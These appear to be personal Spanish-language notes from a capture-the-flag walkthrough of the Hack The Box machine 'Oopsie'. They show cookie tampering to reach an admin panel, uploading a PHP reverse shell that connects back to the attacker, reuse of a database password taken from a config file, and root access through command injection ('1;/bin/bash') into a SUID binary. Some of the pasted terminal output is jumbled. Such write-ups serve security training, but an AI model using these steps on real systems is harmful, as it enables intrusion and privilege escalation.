OOOPSIE
=======
http://10.129.172.19/js/min.js:
window.HUB_EVENTS={ASSET_ADDED:"ASSET_ADDED",ASSET_DELETED:"ASSET_DELETED",ASSET_DESELECTED:"ASSET_DESELECTED",ASSET_SELECTED:"ASSET_SELECTED",ASSET_UPDATED:"ASSET_UPDATED",CONSOLE_CHANGE:"CONSOLE_CHANGE",CONSOLE_CLOSED:"CONSOLE_CLOSED",CONSOLE_EVENT:"CONSOLE_EVENT",CONSOLE_OPENED:"CONSOLE_OPENED",CONSOLE_RUN_COMMAND:"CONSOLE_RUN_COMMAND",CONSOLE_SERVER_CHANGE:"CONSOLE_SERVER_CHANGE",EMBED_ACTIVE_PEN_CHANGE:"EMBED_ACTIVE_PEN_CHANGE",EMBED_ACTIVE_THEME_CHANGE:"EMBED_ACTIVE_THEME_CHANGE",EMBED_ATTRIBUTE_CHANGE:"EMBED_ATTRIBUTE_CHANGE",EMBED_RESHOWN:"EMBED_RESHOWN",IFRAME_PREVIEW_RELOAD_CSS:"IFRAME_PREVIEW_RELOAD_CSS",IFRAME_PREVIEW_URL_CHANGE:"IFRAME_PREVIEW_URL_CHANGE",KEY_PRESS:"KEY_PRESS",PEN_CHANGE_SERVER:"PEN_CHANGE_SERVER",PEN_CHANGE:"PEN_CHANGE",PEN_EDITOR_CLOSE:"PEN_EDITOR_CLOSE",PEN_EDITOR_CODE_FOLD:"PEN_EDITOR_CODE_FOLD",PEN_EDITOR_ERRORS:"PEN_EDITOR_ERRORS",PEN_EDITOR_EXPAND:"PEN_EDITOR_EXPAND",PEN_EDITOR_FOLD_ALL:"PEN_EDITOR_FOLD_ALL",PEN_EDITOR_LOADED:"PEN_EDITOR_LOADED",PEN_EDITOR_REFRESH_REQUEST:"PEN_EDITOR_REFRESH_REQUEST",PEN_EDITOR_RESET_SIZES:"PEN_EDITOR_RESET_SIZES",PEN_EDITOR_SIZES_CHANGE:"PEN_EDITOR_SIZES_CHANGE",PEN_EDITOR_UI_CHANGE_SERVER:"PEN_EDITOR_UI_CHANGE_SERVER",PEN_EDITOR_UI_CHANGE:"PEN_EDITOR_UI_CHANGE",PEN_EDITOR_UI_DISABLE:"PEN_EDITOR_UI_DISABLE",PEN_EDITOR_UI_ENABLE:"PEN_EDITOR_UI_ENABLE",PEN_EDITOR_UNFOLD_ALL:"PEN_EDITOR_UNFOLD_ALL",PEN_ERROR_INFINITE_LOOP:"PEN_ERROR_INFINITE_LOOP",PEN_ERROR_RUNTIME:"PEN_ERROR_RUNTIME",PEN_ERRORS:"PEN_ERRORS",PEN_LIVE_CHANGE:"PEN_LIVE_CHANGE",PEN_LOGS:"PEN_LOGS",PEN_MANIFEST_CHANGE:"PEN_MANIFEST_CHANGE",PEN_MANIFEST_FULL:"PEN_MANIFEST_FULL",PEN_SAVED:"PEN_SAVED",POPUP_CLOSE:"POPUP_CLOSE",POPUP_OPEN:"POPUP_OPEN",POST_CHANGE:"POST_CHANGE",POST_SAVED:"POST_SAVED",PROCESSING_COMPLETE:"PROCESSING_COMPLETE",PROCESSING_STARTED:"PROCESSED_STARTED"},"object"!=typeof window.CP&&(window.CP={}),window.CP.PenTimer={programNoLongerBeingMonitored:!1,timeOfFirstCallToShouldStopLoop:0,_loopExits:{},_loopTimers:{},START_MONITORING_AFTER:2e3,STOP_ALL_MONITORING_TIMEOUT:5e3,MAX_TIME_IN_LOOP_WO_EXIT:2200,exitedLoop:function(E){this._loopExits[E]=!0},shouldStopLoop:function(E){if(this.programKilledSoStopMonitoring)return!0;if(this.programNoLongerBeingMonitored)return!1;if(this._loopExits[E])return!1;var _=this._getTime();if(0===this.timeOfFirstCallToShouldStopLoop)return this.timeOfFirstCallToShouldStopLoop=_,!1;var o=_-this.timeOfFirstCallToShouldStopLoop;if(o<this.START_MONITORING_AFTER)return!1;if(o>this.STOP_ALL_MONITORING_TIMEOUT)return this.programNoLongerBeingMonitored=!0,!1;try{this._checkOnInfiniteLoop(E,_)}catch(N){return this._sendErrorMessageToEditor(),this.programKilledSoStopMonitoring=!0,!0}return!1},_sendErrorMessageToEditor:function(){try{if(this._shouldPostMessage()){var E={topic:HUB_EVENTS.PEN_ERROR_INFINITE_LOOP,data:{line:this._findAroundLineNumber()}};parent.postMessage(E,"*")}else this._throwAnErrorToStopPen()}catch(_){this._throwAnErrorToStopPen()}},_shouldPostMessage:function(){return document.location.href.match(/boomerang/)},_throwAnErrorToStopPen:function(){throw"We found an infinite loop in your Pen. We've stopped the Pen from running. Please correct it or contact support@codepen.io."},_findAroundLineNumber:function(){var E=new Error,_=0;if(E.stack){var o=E.stack.match(/boomerang\S+:(\d+):\d+/);o&&(_=o[1])}return _},_checkOnInfiniteLoop:function(E,_){if(!this._loopTimers[E])return this._loopTimers[E]=_,!1;var o;if(_-this._loopTimers[E]>this.MAX_TIME_IN_LOOP_WO_EXIT)throw"Infinite Loop found on loop: "+E},_getTime:function(){return+new Date}},window.CP.shouldStopExecution=function(E){var _=window.CP.PenTimer.shouldStopLoop(E);return!0===_&&console.warn("[CodePen]: An infinite loop (or a loop taking too long) was detected, so we stopped its execution. Sorry!"),_},window.CP.exitedLoop=function(E){window.CP.PenTimer.exitedLoop(E)};

CÓDIGO FUENTE DE index.php
--------------------------
<script src="/cdn-cgi/login/script.js"></script>    <<<<<<<<<<<<<<<< página de login
<script src="/js/index.js"></script>                 <<< vacía

INVESTIGO:
http://10.129.172.19/cdn-cgi/login/

EL ENLACE DE INVITADOS LLEVA A UNA PÁGINA DE ADMINISTRACIÓN:
http://10.129.172.19/cdn-cgi/login/admin.php?content=accounts&id=1

Repair Management System


Access ID	Name	Email
34322	admin	admin@megacorp.com

Access ID	Name	Email
2233	guest	guest@megacorp.com

http://10.129.172.19/cdn-cgi/login/admin.php?content=uploads


---------------------------------------------------------------

Se cambian las cookies con el Inspector de Firefox en Storage


Una vez identificado se sube una revershell shell aqui:
 http://10.129.172.19/cdn-cgi/login/admin.php?content=uploads&action=upload

https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php


http://10.129.172.19/uploads/rr.php


$ cd /home
$ ls
robert
$ cd robert
$ ls
user.txt
$ cat user.txt
f2c74ee8db7983851ab2a96a44eb7981 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<

$ python3 -c 'import pty;pty.span("/bin/bash")'

Monto un servidor http con ptyhon3:
listening on [any] 1234 ...
connect to [10.10.15.44] from (UNKNOWN) [10.129.164.195] 45240
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 
 20:53:02 up 28 min,  0 users,  load average: 0.08, 0.02, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -m http.server 8088


Navego hasta carpetas hasta encontrar la clave de Robert
--------------------------------------------------------

<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

www-data@oopsie:/var$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/var$ whoami
whoami
robert
robert@oopsie:/var$ 


robert@oopsie:/$ mysql -u robert localhost -p
mysql -u robert localhost -p
Enter password: M3g4C0rpUs3r!

ERROR 1049 (42000): Unknown database 'localhost'
robert@oopsie:/$ mysql -u robert garage -p       
mysql -u robert garage -p
Enter password: M3g4C0rpUs3r!

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 27
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
show tables;
+------------------+
| Tables_in_garage |
+------------------+
| accounts         |
| branding         |
| clients          |
+------------------+
3 rows in set (0.00 sec)

mysql> describe accounts;
describe accounts;
+--------+--------------+------+-----+---------+-------+
| Field  | Type         | Null | Key | Default | Extra |
+--------+--------------+------+-----+---------+-------+
| id     | int(11)      | YES  |     | NULL    |       |
| access | int(11)      | YES  |     | NULL    |       |
| name   | varchar(100) | YES  |     | NULL    |       |
| email  | varchar(100) | YES  |     | NULL    |       |
+--------+--------------+------+-----+---------+-------+
4 rows in set (0.00 sec)

mysql> select * from accounts;
select * from accounts;
+------+--------+-------------+-------------------------+
| id   | access | name        | email                   |
+------+--------+-------------+-------------------------+
|   13 |  57633 | Peter       | peter@qpic.co.uk        |
|   23 |  28832 | Rafol       | tom@rafol.co.uk         |
|    4 |   8832 | john        | john@tafcz.co.uk        |
|   30 |  86575 | super admin | superadmin@megacorp.com |
|    1 |  34322 | admin       | admin@megacorp.com      |
|    2 |   2233 | guest       | guest@megacorp.com      |
+------+--------+-------------+-------------------------+
6 rows in set (0.00 sec)


mysql> 


mysql> select * from branding
select * from branding
    -> ;
;
+------+---------+----------+
| id   | model   | price    |
+------+---------+----------+
|    1 | MC-1023 | $100,240 |
|   10 | MC-1123 | $110,240 |
|   20 | MC-2123 | $110,340 |
|    2 | MC-2124 | $100,430 |
+------+---------+----------+
4 rows in set (0.00 sec)

mysql> 


select * from clients;
+------+--------+-------------------+
| id   | name   | email             |
+------+--------+-------------------+
|    1 | Tafcz  | john@tafcz.co.uk  |
|   13 | Rafol  | tom@rafol.co.uk   |
|   23 | Qpic   | peter@qpic.co.uk  |
|    2 | client | client@client.htb |
+------+--------+-------------------+
4 rows in set (0.00 sec)

mysql> 
---------------------------------------

if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
www-data@oopsie:/var/www/html/cdn-cgi/login$ grep -rla passw*



Investigo robert:
-----------------
robert@oopsie:/var/www/html/cdn-cgi/login$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
robert@oopsie:/var/www/html/cdn-cgi/login$ whoami
whoami
robert
robert@oopsie:/var/www/html/cdn-cgi/login$ find / -group bugtracker 2>/dev/null
find / -group bugtracker 2>/dev/null

robert@oopsie:/var/www/html/cdn-cgi/login$ ls -l /usr/bin/bugtracker
ls -l /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
robert@oopsie:/var/www/html/cdn-cgi/login$ 





robert@oopsie:/var/www/html/cdn-cgi/login$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ;ls
;ls
---------------

cat: /root/reports/: Is a directory
admin.php  db.php  index.php  script.js

robert@oopsie:/var/www/html/cdn-cgi/login$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1;/bin/bash
1;/bin/bash       <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
root@oopsie:/var/www/html/cdn-cgi/login# whoami
whoami
root
root@oopsie:/var/www/html/cdn-cgi/login# obert@oopsie:/var/www/html/cdn-cgi/login$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1;/bin/bash
1;/bin/bash
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
n$ /usr/bin/bugtrackerhtml/cdn-cgi/login
bash: obert@oopsie:/var/www/html/cdn-cgi/login$: No such file or directory
root@oopsie:/var/www/html/cdn-cgi/login# /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ---------------

cat: /root/reports/------------------: No such file or directory

root@oopsie:/var/www/html/cdn-cgi/login# 


root@oopsie:/var/www/html/cdn-cgi/login# whoami
whoami
root
root@oopsie:/var/www/html/cdn-cgi/login# ls /root     
ls /root
reports  root.txt
root@oopsie:/var/www/html/cdn-cgi/login# cat /root/root.txt
cat /root/root.txt
af13b0bee69f8a877c3faf667f7beacf              <<<<<<<<<<<<<<<<<<<<<<<<<<<<<
root@oopsie:/var/www/html/cdn-cgi/login# 
